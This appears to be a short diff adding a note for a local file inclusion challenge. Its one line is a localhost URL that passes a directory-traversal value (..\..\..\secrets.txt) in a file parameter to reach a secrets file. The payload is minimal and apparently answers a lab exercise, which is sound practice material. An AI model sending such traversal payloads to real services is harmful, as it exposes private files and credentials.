@@ -1,0 +1,5 @@
+### LFI challenge
+
+http://127.0.0.1:8080/find_secret?file=..\..\..\secrets.txt
+
+
